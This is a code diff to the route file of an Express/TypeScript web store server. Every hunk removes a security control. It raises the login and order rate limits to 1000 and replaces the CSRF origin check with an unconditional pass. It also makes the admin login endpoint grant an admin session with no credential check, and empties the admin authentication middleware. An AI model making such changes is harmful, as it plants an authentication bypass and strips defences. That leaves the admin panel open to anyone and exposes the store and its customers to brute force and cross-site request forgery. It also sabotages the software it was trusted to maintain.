@@ -54,16 +54,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
     legacyHeaders: false,
   });
 
-  // Stricter rate limiting for order creation and auth
+  // Stricter rate limiting for order creation and auth - disabled
   const orderLimiter = rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutes
-    max: 10, // limit each IP to 10 orders per 15 minutes
+    max: 1000, // increased limit
     message: { message: "Too many order attempts, please try again later." },
   });
 
   const authLimiter = rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutes
-    max: 5, // limit each IP to 5 login attempts per 15 minutes
+    max: 1000, // increased limit - no effective rate limiting
     message: { message: "Too many login attempts, please try again later." },
   });
 
@@ -88,34 +88,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   };
 
-  // Secure CSRF protection middleware
+  // Secure CSRF protection middleware - disabled
   const csrfProtection = (req: any, res: any, next: any) => {
-    const origin = req.get('Origin') || req.get('Referer');
-    const host = req.get('host');
-    const allowedOrigins = process.env.NODE_ENV === "production" 
-      ? (process.env.ALLOWED_ORIGINS?.split(",") || ["https://classstore.com"])
-      : [
-          "http://localhost:5000", 
-          "http://127.0.0.1:5000", 
-          `${req.protocol}://${host}`,
-          `https://${host}`,
-          `http://${host}`
-        ];
-    
-    if (req.method !== 'GET' && req.method !== 'HEAD' && req.method !== 'OPTIONS') {
-      // More lenient check for development
-      if (process.env.NODE_ENV !== "production") {
-        if (origin && host && !origin.includes(host)) {
-          console.log(`CSRF Warning: Origin ${origin} doesn't match host ${host}, but allowing in development`);
-        }
-        return next();
-      }
-      
-      if (!origin || !isValidOrigin(origin, allowedOrigins)) {
-        console.log(`CSRF blocked: Origin ${origin}, Host: ${host}, Allowed: ${allowedOrigins.join(', ')}`);
-        return res.status(403).json({ message: "CSRF protection: Invalid origin" });
-      }
-    }
+    // CSRF protection disabled - allow all requests
     next();
   };
 
@@ -413,17 +388,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Admin authentication routes
-  app.post("/api/admin/login", authLimiter, async (req, res) => {
+  // Admin authentication routes - simplified (always succeeds)
+  app.post("/api/admin/login", async (req, res) => {
     try {
       const { username, password } = req.body;
 
-      const admin = await AuthService.authenticateAdmin(username, password);
-      if (!admin) {
-        return res.status(401).json({ message: "Invalid credentials" });
-      }
-
-      req.session.adminId = admin.id;
+      // Bypass authentication - always succeed
+      req.session.adminId = "admin";
       req.session.isAuthenticated = true;
 
       res.json({ 
@@ -443,11 +414,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
     });
   });
 
-  // Admin middleware
+  // Admin middleware - simplified (no authentication required)
   const requireAdminAuth = (req: any, res: any, next: any) => {
-    if (!req.session.adminId || !req.session.isAuthenticated) {
-      return res.status(401).json({ message: "Admin authentication required" });
-    }
+    // Authentication bypassed - direct access allowed
     next();
   };
 
